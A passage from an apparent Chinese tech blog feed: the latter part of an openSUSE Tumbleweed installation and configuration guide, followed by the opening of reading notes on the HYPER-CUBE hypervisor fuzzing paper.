src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124004637.png"></p><p>桌面就按需选择了，笔者推荐选择 openSUSE 默认的 KDE Plasma ：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124005130.png"></p><p>硬盘分区的话笔者建议还是<strong>手动分区</strong>（选择下方的 <code>Expert Partitioner</code> 按钮中的 <code>Start with Existing Partitions</code>，之后直接选中对应硬盘并 <code>Add Partion...</code> 就会有非常细致的分区创建引导），因为他自动分区的逻辑有点怪怪的（之前自动分区差点把笔者原本的数据盘给抹了），主要是两个分区：</p><ul><li>EFI 分区（<code>EFI Boot Partion</code>，<strong>必须为 fat32 格式</strong>）：放 GRUB 和内核的地方，用来启动系统，需要挂载在 <code>/boot/efi</code> 下边</li><li>系统分区（<code>Operating System</code>，推荐还是 ext4，brtfs 强制重启容易炸）：系统基本环境，需要挂载在 <code>/</code> 下边</li></ul><blockquote><p>这里笔者<strong>不推荐和 Windows 混用同一个 EFI 分区</strong>，最好自己自立门户，一是 Win 原本的 EFI 分区实在太小随便塞点东西就爆了，二是独立分区干啥都方便不会影响到隔壁的 Win</p></blockquote><p>当然，也可以像笔者一样额外分一个分区做数据分区挂在 <code>/home</code> 下边，后面重装各种其他发行版都方便， <em>因为这里是虚拟机演示所以就只分了两个分区</em> ：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124005751.png"></p><p>时区设置和创建用户这种常规操作笔者就不截图了，最后来到安装前的最后确认环节，这里笔者建议把 Secure Boot 给关了，不然后面升级闭源显卡驱动可能会比较麻烦，<del>以及笔者觉得这个特性在个人电脑上完全没必要，真有人会来打吗</del></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010003.png"></p><p>安装好后会自动重启，这个时候默认进的就是 GRUB 界面了，可以选择进入 Windows 还是 Linux：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124013040.png"></p><p>这里不得不夸的一点是<strong>openSUSE 无缝地将笔者之前的 KDE 美化给迁移了过来</strong>（当笔者从 Arch 往 Fedora 上迁移时、重新安装 Fedora 时，这块都没太能处理好），把 <code>latte-dock</code> 给安装上之后笔者就像没换过系统一样：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/img_v3_025f_b217ee22-634c-432b-95ad-8c5569d0081g.jpg"></p><h1 id="0x03-安装-NVIDIA-Driver"><a href="#0x03-安装-NVIDIA-Driver" class="headerlink" title="0x03. 安装 NVIDIA Driver"></a>0x03. 安装 NVIDIA Driver</h1><p>openSUSE 默认不引入 non-OSS 软件，所以默认为 NVIDIA 显卡安装的是开源的 <code>nouveau</code> 驱动， <del>因为是社区逆向出来的所以不仅功能不全而且性能吊差</del> ，所以我们需要安装 NVIDIA 的官方驱动以获取更好的使用体验。</p><h3 id="闭源驱动（by-default）"><a href="#闭源驱动（by-default）" class="headerlink" title="闭源驱动（by default）"></a>闭源驱动（by default）</h3><blockquote><p>如果你用的是 A 卡或者仅有核显，则可以跳过这一章节</p></blockquote><p>YaST 是很好很强大的一个综合性工具，这也是 SUSE 系发行版的魅力之一，通过 YaST可以非常方便地管理包括软件安装在内的各项系统配置</p><p>首先用 zypper 引入 Nvidia 驱动仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper addrepo --refresh https://download.nvidia.com/opensuse/tumbleweed NVIDIA<br></code></pre></td></tr></table></figure><p>然后打开 <code>YaST-&gt;Software Management</code>，她会直接帮你选好需要安装的包，直接安就完事了：）</p><p>当然，你也可以手动进入 <code>YaST-&gt;Software Management-&gt;View-&gt;Repositories-&gt;NVIDIA</code> 选择要安装哪些包，一般来说最新的 NVIDIA 显卡直接选择最新的 <code>G06</code> 相关套件即可，其他的老显卡建议参考 <a href="https://en.opensuse.org/SDB:NVIDIA_drivers">openSUSE Wiki</a>，以笔者的电脑为例安装了以下这些包：</p><p><img src="https://s2.loli.net/2023/11/23/dbWQVyqU7Z1A9SN.png"></p><p>安装过程中 YaST 会自动帮你把 <code>nouveau</code> 给禁用了，完成之后直接重启，在终端输入 <code>nvidia-smi</code> 就可以看到显卡相关信息：</p><p><img src="https://s2.loli.net/2023/11/23/t9Qak3RJx7Yq4Xu.png" alt="image.png"></p><p>接下来更新 Grub 配置，不更新的话多重启几次可能桌面就会莫名其妙寄了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo vim /etc/default/grub<br></code></pre></td></tr></table></figure><p>在这个文件中找到 <code>GRUB_CMDLINE_LINUX</code> ，在其中加入如下内容：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">modprobe.<span class="hljs-attribute">blacklist</span>=nouveau rd.driver.<span class="hljs-attribute">blacklist</span>=nouveau nvidia-drm.<span class="hljs-attribute">modeset</span>=1<br></code></pre></td></tr></table></figure><p>应用新的 GRUB 配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo grub2-mkconfig -o /boot/grub2/grub.cfg<br></code></pre></td></tr></table></figure><h3 id="开源驱动（only-for-RTX-2000-and-newer）"><a href="#开源驱动（only-for-RTX-2000-and-newer）" class="headerlink" title="开源驱动（only for RTX 2000 and newer）"></a>开源驱动（only for RTX 2000 and newer）</h3><p><del>可能是被 Linus 给 fuck 太多了，</del> NVIDIA <a href="https://developer.nvidia.com/blog/nvidia-releases-open-source-gpu-kernel-modules/">在 2022 年放出了开源的 Linux 内核模块</a>，为 Linuxer 们提供了除了闭源驱动以外的一个新的选择。</p><p>和安装闭源显卡驱动一样，首先用 zypper 引入 Nvidia 驱动仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper addrepo --refresh https://download.nvidia.com/opensuse/tumbleweed NVIDIA<br></code></pre></td></tr></table></figure><p>然后打开 <code>YaST-&gt;Software Management</code>，搜索 nvidia,勾上这两个带 <code>open</code> 字样的包之后让 YaST 帮你自动完成即可：</p><p><img src="https://s2.loli.net/2024/04/15/zOhtWciCZRmnLyS.png" alt="笔者这里是已经安装好了所以显示绿底打勾，如果是待安装则通常应当是一个蓝底白十字"></p><h1 id="0x04-安装中文与输入法"><a href="#0x04-安装中文与输入法" class="headerlink" title="0x04. 安装中文与输入法"></a>0x04. 安装中文与输入法</h1><p>openSUSE Tumbleweed 安装媒介中自带的中文有些问题，因此我们需要安装 English 系统后手动将中文给安装上</p><p>首先是将简体中文添加为第二语言（笔者不推荐作为第一语言，否则万一系统崩了以后进入 tty 抢救的时候会让你感到很崩溃），打开 <code>YaST-&gt;System-&gt;Language</code>，勾上 <code>Simplified Chinese</code> 后直接点 <code>OK</code> 就可以自动安装了：</p><p><img src="https://s2.loli.net/2023/11/23/pe6DK84kNB3cSZj.png" alt="image.png"></p><p>需要注意的是这里的进度条会莫名其妙变成负数，<strong>不影响正常安装</strong>，只是我们不能看到正确的进度罢了，慢慢等就行了：</p><p><img src="https://s2.loli.net/2023/11/23/AWh6xErjFi8XVTN.jpg"></p><p>完成中文的安装之后接下来我们来安装输入法，目前 Linux 下最火的中文输入法之一为 <code>fcitx</code>，直接通过 zypper 进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in fcitx5 fcitx5-chinese-addons<br></code></pre></td></tr></table></figure><p>之后在设置里将 virtual keyboard 设为 fcitx5 并添加 input method <code>Pinyin</code> 即可：</p><p><img src="https://s2.loli.net/2023/11/23/MPsnu5im38qRI2G.png" alt="image.png"></p><h1 id="0x05-软件相关配置"><a href="#0x05-软件相关配置" class="headerlink" title="0x05. 软件相关配置"></a>0x05. 软件相关配置</h1><h3 id="常用软件安装"><a href="#常用软件安装" class="headerlink" title="常用软件安装"></a>常用软件安装</h3><p>比如说大家都喜欢的代码编辑器 <code>vscode</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc<br>sudo zypper addrepo https://packages.microsoft.com/yumrepos/vscode vscode<br>sudo zypper refresh<br>sudo zypper install code<br></code></pre></td></tr></table></figure><p>Chrome 浏览器的安装需要借助 <a href="https://en.opensuse.org/SDB:OBS_Package_Installer">OPI</a>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in opi<br>sudo opi chrome<br></code></pre></td></tr></table></figure><p>Docker 的安装直接按照 <a href="https://en.opensuse.org/Docker">wiki</a> 即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper install docker docker-compose docker-compose-switch<br>sudo systemctl enable docker<br>sudo usermod -G docker -a $USER # 将当前用户添加到 docker,后面就不用总是 sudo docker 了<br>sudo reboot # 重启就完事了<br></code></pre></td></tr></table></figure><p>openSUSE 是 RPM 系，因此大部分软件其实也可以直接将 rpm 包下载下来用 zypper 安装即可，以<a href="https://www.feishu.cn/download">飞书 Linux 版</a>为例：</p><p><img src="https://s2.loli.net/2023/11/23/3xMHfgpuzaDsXrQ.png" alt="image.png"></p><p>笔者在海外，有的时候会用到 Discord、Telegram 这样的软件，他们都是有 Linux 原生版本的（这里就不得不吐槽国内的一些软件迟迟不出 Linux 版了），直接用 zypper 安装即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in discord telegram-desktop<br></code></pre></td></tr></table></figure><p>一些只有 Windows 版本的软件（例如微信）可以尝试用 <code>wine</code> 打开，使用 zypper 可以直接安装 <code>wine</code>，<code>winetricks</code> 则是用来进行功能补充的小工具：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in wine winetricks<br></code></pre></td></tr></table></figure><h3 id="安装-Flatpak"><a href="#安装-Flatpak" class="headerlink" title="安装 Flatpak"></a>安装 Flatpak</h3><p>一些 openSUSE 没有的包也可以用 flatpak 从其他地方打过来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in flatpak<br>flatpak remote-add --user --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo<br>flatpak update<br></code></pre></td></tr></table></figure><p>接下来让 flatpak 包的升级和 KDE&#x2F;Gnome 的 software update 无缝融合，首先创建 service：</p><blockquote><p>注：为了安全起见，这里我们采用用户级而非系统级配置</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl --user edit --full --force flatpak-user-update.service<br></code></pre></td></tr></table></figure><p>之后写入如下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=Flatpak Automatic Update<br><span class="hljs-attr">Documentation</span>=man:flatpak(<span class="hljs-number">1</span>)<br><span class="hljs-attr">Wants</span>=network-<span class="hljs-literal">on</span>line.target<br><span class="hljs-attr">After</span>=network-<span class="hljs-literal">on</span>line.target<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Type</span>=<span class="hljs-literal">on</span>eshot<br><span class="hljs-attr">ExecStart</span>=/usr/bin/flatpak --user uninstall --unused -y --noninteractive <span class="hljs-comment">; /usr/bin/flatpak --user update -y --noninteractive ; /usr/bin/flatpak --user repair</span><br></code></pre></td></tr></table></figure><p>然后用如下命令创建 timer：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl --user edit --full --force flatpak-user-update.timer<br></code></pre></td></tr></table></figure><p>之后加入如下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=Flatpak Automatic Update Trigger<br><span class="hljs-attr">Documentation</span>=man:flatpak(<span class="hljs-number">1</span>)<br><br><span class="hljs-section">[Timer]</span><br><span class="hljs-attr">RandomizedDelaySec</span>=<span class="hljs-number">10</span>m<br><span class="hljs-attr">OnBootSec</span>=<span class="hljs-number">2</span>m<br><span class="hljs-attr">OnCalendar</span>=*-*-* <span class="hljs-number">4</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attr">Persistent</span>=<span class="hljs-literal">true</span><br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=timers.target<br></code></pre></td></tr></table></figure><p>完成后启动 timer：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl --<span class="hljs-keyword">user</span> <span class="hljs-title">daemon-reload</span><br>systemctl --<span class="hljs-keyword">user</span> <span class="hljs-title">enable</span> --now flatpak-user-update.timer<br></code></pre></td></tr></table></figure><h3 id="配置-Wine"><a href="#配置-Wine" class="headerlink" title="配置 Wine"></a>配置 Wine</h3><p><strong>红酒</strong>（wine）是 Linux 下的一个 Win API 兼容层，实现了对绝大多数常见 Win API 的重写，利用 wine 我们可以在 Linux 下运行相当一部分 Windows 中的 EXE 程序</p><p>首先安装 wine 和 winetricks：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> wine winetricks</span><br></code></pre></td></tr></table></figure><p>安装 fakechinese,解决部分程序的中文字体显示为方块字的问题：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">winetricks fakechinese</span><br></code></pre></td></tr></table></figure><p>大部分情况下<a href="https://github.com/vufa/deepin-wine-wechat-arch/issues/94">通用的解决方案</a>还是下载一份中文字体，例如微软雅黑，之后放到 <code>~/.wine/drive_c/windows/Fonts/</code> 下</p><h3 id="使用-openSUSE-Open-Builid-Service（OBS）"><a href="#使用-openSUSE-Open-Builid-Service（OBS）" class="headerlink" title="使用 openSUSE Open Builid Service（OBS）"></a>使用 openSUSE Open Builid Service（OBS）</h3><p>开放构建服务（Open Build Service</p><p>首先安装 osc：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> osc</span><br></code></pre></td></tr></table></figure><h1 id="0x06-ASUS-Laptop-相关的一些配置"><a href="#0x06-ASUS-Laptop-相关的一些配置" class="headerlink" title="0x06. ASUS Laptop 相关的一些配置"></a>0x06. ASUS Laptop 相关的一些配置</h1><blockquote><p>如果你的电脑不是华硕笔记本，可以直接跳过这一部分</p></blockquote><p><a href="https://asus-linux.org/">ASUS Linux</a> 是一个为 ASUS Laptop 提供额外支持的民间社区，通过 <code>asusctl</code> 与 <code>supergfxctl</code> 这两个工具我们可以非常方便地配置笔记本的各种配置</p><p>首先引入 ASUS Linux 的仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper ar --priority 50 --refresh https://download.opensuse.org/repositories/home:/luke_nukem:/asus/openSUSE_Tumbleweed/ asus-linux<br></code></pre></td></tr></table></figure><p>安装 <code>asusctl</code>，并用 <code>power-profiles-daemon</code> 替换掉 <code>tlp</code> 作为默认的电源管理服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper rm tlp<br>sudo zypper in asusctl<br>sudo zypper in power-profiles-daemon<br>sudo systemctl enable --now power-profiles-daemon.service<br>sudo systemctl start asusd<br></code></pre></td></tr></table></figure><p>为了保养电池，可以用 <code>asusctl</code> 将最大充电限制在 80：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo asusctl -c 80<br></code></pre></td></tr></table></figure><p>然后安装 <code>supergfxctl</code> 用以管理显卡，并替换掉过时的 <code>suse-prime</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper rm suse-prime<br>sudo zypper in supergfxctl<br>sudo systemctl enable --now supergfxd<br></code></pre></td></tr></table></figure><p>例如外出时可以用 <code>supergfxctl</code> 切换到集显输出以省电：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo supergfxctl -s # 查看笔记本支持的视频输出模式<br>sudo supergfxctl -g # 查看当前的视频输出模式<br>sudo supergfxctl -m Integrated # 设置为集显输出<br>sudo supergfxctl -m Hybrid # 设置为混合输出<br></code></pre></td></tr></table></figure><blockquote><p>社区其实还提供了一个图形化配置界面 <code>asusctl-rog-gui</code>，不过其实功能都是一样的：）</p></blockquote><h1 id="0x07-个人配置优化"><a href="#0x07-个人配置优化" class="headerlink" title="0x07. 个人配置优化"></a>0x07. 个人配置优化</h1><h3 id="使用个人账户而非-root-进行特权操作"><a href="#使用个人账户而非-root-进行特权操作" class="headerlink" title="使用个人账户而非 root 进行特权操作"></a>使用个人账户而非 root 进行特权操作</h3><p>笔者个人以前的使用习惯是 root 账户和个人账户使用不同的密码，然后要进行特权操作都是以个人账户的身份 <code>sudo</code> 进行，但在 openSUSE 下默认会重定向到使用 root 账户：</p><p><img src="https://s2.loli.net/2024/07/03/fkyPXi243wSGB6I.png" alt="在 VM 新截的图"></p><blockquote><p>注：这也是 Linus 当年<a href="https://forums.opensuse.org/t/linus-on-opensuse/78107">舍弃 openSUSE 的原因</a>，这个非常规的权限管控理念确实有点谔谔</p></blockquote><p>解决方案是编辑 sudo 配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">EDITOR=vim sudoedit /usr/etc/sudoers</span><br></code></pre></td></tr></table></figure><p>找到如下这一行，改成这样（去掉前面的 <code>#</code> 注释符）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sudo">## Uncomment to allow members of group wheel to execute any command<br>%wheel ALL=(ALL:ALL) ALL<br></code></pre></td></tr></table></figure><h3 id="单击选中而非打开"><a href="#单击选中而非打开" class="headerlink" title="单击选中而非打开"></a>单击选中而非打开</h3><p>KDE Dolphin 经典配置了，不过笔者更习惯 Windows 那样的单击选择双击打开的模式，这里只需要在系统设置中的 <code>Workspace Behaviour-&gt;General Behaviour</code> 中勾选 <code>Selects them</code> 即可</p><h3 id="笔记本盒盖行为优化"><a href="#笔记本盒盖行为优化" class="headerlink" title="笔记本盒盖行为优化"></a>笔记本盒盖行为优化</h3><p>KDE 桌面默认是盒盖后锁屏（Lock Screen），但是在 <code>System Setting-&gt;Hardware-&gt;Power Management</code> 中的 <code>Energy Saving</code> 中可以更改笔记本盒盖行为，常用的应该就是：</p><ul><li>Sleep：传统睡眠，保留内存和一些基本组建的供电</li><li>Hybrid Sleep：混合睡眠，简而言之就是数据留内存的同时写入硬盘，主要针对台式机可能会突发断电的情况</li><li>Hibernate：传统休眠，内存数据转存到硬盘上，电源关闭进入低功耗模式</li></ul><h1 id="0x08-一些问题解决"><a href="#0x08-一些问题解决" class="headerlink" title="0x08. 一些问题解决"></a>0x08. 一些问题解决</h1><h3 id="笔记本休眠-盒盖后无法唤醒"><a href="#笔记本休眠-盒盖后无法唤醒" class="headerlink" title="笔记本休眠&#x2F;盒盖后无法唤醒"></a>笔记本休眠&#x2F;盒盖后无法唤醒</h3><p>笔者这边看 journalctl 似乎是 N 卡的问题（ <del>so nvidia, fxck you!</del> ），在 <code>/etc/default/grub</code> 中的 <code>GRUB_CMD_LINUX</code> 中加入：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">acpi_rev_override</span>=1 <span class="hljs-attribute">acpi_osi</span>=Linux <span class="hljs-attribute">mem_sleep_default</span>=deep<br></code></pre></td></tr></table></figure><p>之后通过如下命令更新 grub 配置即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo grub2-mkconfig -o /boot/grub2/grub.cfg</span><br></code></pre></td></tr></table></figure><!--0x09. 使用 Docker 搭建深度学习环境 很多时候我们希望保证计算机主环境的整洁与完整性，毕竟万一某一天配各种软件把依赖给搞崩了就比较尴尬了，因此很多任务我们其实可以直接通过 Docker 来完成，虽然 openSUSE 自己也有深度学习框架，但是真用 openSUSE 来搞深度学习的终究是少数（国人就更少了），相对应地在网上的资料也比较少，因此我们这里选择使用 Ubuntu 镜像来搭建容器环境，毕竟搞机器学习的最重要的**就是那张卡**，而不是各种奇怪的系统环境-->]]></content>
    
    
    <summary type="html">&lt;p&gt;你说🉐对，但是 Arch Linux 是由 Arch 社区开发的一个 Linux 发行版…&lt;/p&gt;</summary>
    
    
    
    <category term="DISTRO" scheme="https://arttnba3.github.io/categories/DISTRO/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="openSUSE" scheme="https://arttnba3.github.io/tags/openSUSE/"/>
    
    <category term="openSUSE Tumbleweed" scheme="https://arttnba3.github.io/tags/openSUSE-Tumbleweed/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x04】论文笔记：HYPER-CUBE: High-Dimensional Hypervisor Fuzzing</title>
    <link href="https://arttnba3.github.io/2023/10/27/PAPER-0X04-HYPER_CUBE/"/>
    <id>https://arttnba3.github.io/2023/10/27/PAPER-0X04-HYPER_CUBE/</id>
    <published>2023-10-27T11:30:54.000Z</published>
    <updated>2024-07-31T09:43:19.242Z</updated>
    
    <content type="html"><![CDATA[<p>hyper 的 不是 visor，是我 cube 哒！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者最近刚好在弄虚拟化相关的工作（<del>本来以为从字节离职后就不会碰到和虚拟化相关的开发了</del>），而刚好笔者看到有一系列论文（还得是论文作者👍）给出了利用系统虚拟化技术来辅助漏洞挖掘以及针对虚拟化系统进行漏洞挖掘的好东西，因此笔者还是打算抽空浅读一下：）</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>虚拟机管理器（Virtual Machine Manager，VMM，aka Hypervisor）是云技术（尤其是 IaaS）的基石，因此其安全问题十分重要</p><p>本文给出 <code>Hyper-Cube</code> ——一个通用的对 hypervisor 进行 fuzzing 的工具</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><blockquote><p><del>没必要讲但还是简单扯几句</del></p></blockquote><p>系统虚拟化技术是云计算的基石，但 VMM 若有漏洞则会影响到其他 VM 以及服务提供商的安全，因此我们需要一种高效的手段找出 VMM 中的漏洞</p><p>模糊测试（Fuzzing）是一个高效的找漏洞手段，但现在我们很难高效地 fuzz VMM：</p><ul><li>不同于传统 fuzz（只有 stdin 和 syscall 作为输入），fuzz VMM 需要与多种类型的接口 （MMIO、PIO、hypercall、…）进行交互</li><li>VMM crash 后的重启开销较大</li><li>很难高效地 fuzz（例如不能多线程）</li></ul><p>论文写作时（笔者注：2020年）最先进的 hypervisor fuzzer 是由 AFL 改来的 <a href="https://hhannuaa.github.io/papers/VDF_raid17.pdf">VDF</a>，只能 fuzz MMIO&#x2F;PIO；另一个 hypervisor fuzzer <a href="https://www.semanticscholar.org/paper/An-Empirical-Study-into-the-Security-Exposure-to-of-Ormandy/b67dc496b84010aa4f2a0f909fb3cb4d36ba78a0">IOFUZZ</a> 则只能往随机端口写随机值，<del>都弱爆了</del></p><p>为了解决这些挑战，本文给出三个可以提升的目标：</p><ul><li>较高的测试用例吞吐量</li><li>能同时与所有可用接口进行交互</li><li>能为一组不同的 hypervisor 生成稳定（stable）与确定（deterministic）的测试用例</li></ul><p>基于此，作者设计出了 <code>HYPER-CUBE</code>：一个基于一个最小客制化操作系统的通用 hypervisor fuzzer，总结下来贡献有如下三点：</p><ul><li>作者设计了一个多维度的（multi-dimentional）、无平台依赖的（platform-independent）能够有效且高效测试不同接口的模糊测试方法</li><li>作者描述了一个能够高效 fuzz hypervisor 的独立于待测平台的方法</li><li>作者通过一个名为 <code>HYPER-CUBE</code> 的客制操作系统实现了这种方法，并能在真实世界的 hypervisor 中找出漏洞</li></ul><p>项目代码开源于 <a href="https://github.com/RUB-SysSec/hypercube">https://github.com/RUB-SysSec/hypercube</a></p><h1 id="0x02-Technology-Background"><a href="#0x02-Technology-Background" class="headerlink" title="0x02. Technology Background"></a>0x02. Technology Background</h1><blockquote><p><del>感觉不如直接看<a href="https://arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/">系统虚拟化导论</a></del></p></blockquote><p>在开始之前先介绍 X86 虚拟化的一些基础知识、X86 中 OS 的启动过程、Guest OS 与 hypervisor 的通信接口</p><h2 id="A-x86-Boot-Process"><a href="#A-x86-Boot-Process" class="headerlink" title="A. x86 Boot Process"></a>A. x86 Boot Process</h2><p>在 x86 机器上最先运行的程序通常是 <code>Basic Input/Output System</code> （BIOS） 或 <code>Unified Extensible Firmware Interface</code> （UEFI），本文将这样的程序称为 <code>固件</code> （firmware），之后便是运行 boot loader （如 GRUB）来准备环境并引导操作系统内核，再由内核来配置其他硬件（如中断控制器、PCI 设备）</p><h2 id="B-Input-Output-on-x86"><a href="#B-Input-Output-on-x86" class="headerlink" title="B. Input&#x2F;Output on x86"></a>B. Input&#x2F;Output on x86</h2><p>x86 上与设备通信的方式有：</p><ul><li><code>Port I/O</code>：传统的端口地址总线，通过 <code>in</code>、<code>out</code> 指令访问</li><li><code>Memory-Mapped I/O</code>：外设寄存器&#x2F;内存被映射到物理地址总线上，从而可以通过传统内存访问方式进行访问</li><li><code>Direct Memory Access</code>：这种机制允许外设直接访问物理内存，本文主要关注 PCI&#x2F;PCIe DMA，而非 ISA DMA（因为难搞）</li></ul><p>表 1 给出接口总览：</p><p><img src="https://s2.loli.net/2023/10/21/1h6xUYOkTNiBVgl.png" alt="TABLE I: Overview of hypervisor attack surfaces."></p><h2 id="C-Hypervisor"><a href="#C-Hypervisor" class="headerlink" title="C. Hypervisor"></a>C. Hypervisor</h2><p>Hypervisor 为 VM 提供可控的虚拟环境（虚拟 CPU、虚拟内存、模拟中断），当 VM 需要进行特权操作时便会触发 <code>VM-Exit</code> 将控制权返还给 hypervisor，由其完成模拟操作后返还控制权——称为 <code>Trap and Emulate</code> 机制</p><p>通过提供完全虚拟化的环境，hypervisor 可以在物理机上同时运行多个 VM</p><h3 id="1-CPU-and-Memory-Virtualization"><a href="#1-CPU-and-Memory-Virtualization" class="headerlink" title="1) CPU and Memory Virtualization"></a>1) CPU and Memory Virtualization</h3><p>过去人们用 <em>二进制转译</em> （binary translation）技术实现完全的 CPU 与内存虚拟化，通过 <code>trap and emulate</code> 模型捕获形如 <code>mov cr3</code> 这样的特权指令，但性能开销巨大，于是 Intel 和 AMD 都各自引入了自己的硬件辅助虚拟化支持</p><h3 id="2-Device-Emulation"><a href="#2-Device-Emulation" class="headerlink" title="2) Device Emulation"></a>2) Device Emulation</h3><p>hypervisor 还需要模拟包括中断控制器在内的标准硬件，其主要有两种交互机制：MMIO 与 port I&#x2F;O，不过 hypervisor 不需要中断 DMA 内存访问</p><p>图 1 给出一个通过 <em>trap and emulate</em> 模型实现设备虚拟化的例子（QEMU&#x2F;KVM）：</p><p><img src="https://s2.loli.net/2023/10/25/OwSxUy159cgsQo7.png" alt="Fig. 1: Device emulation and its trap and emulate handling of privilegedinstructions in KVM and QEMU."></p><h3 id="3-Para-Virtualization"><a href="#3-Para-Virtualization" class="headerlink" title="3) Para-Virtualization"></a>3) 